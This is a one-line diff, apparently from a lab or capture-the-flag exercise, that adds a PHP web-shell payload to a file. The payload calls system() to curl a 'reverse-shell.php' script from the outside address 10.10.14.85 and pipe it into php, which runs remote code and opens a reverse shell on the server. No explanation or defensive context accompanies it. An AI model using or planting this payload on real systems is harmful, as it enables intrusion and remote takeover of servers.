@@ -1,0 +1,1 @@
+<?php system('curl 10.10.14.85/reverse-shell.php|php') ?>,2,3
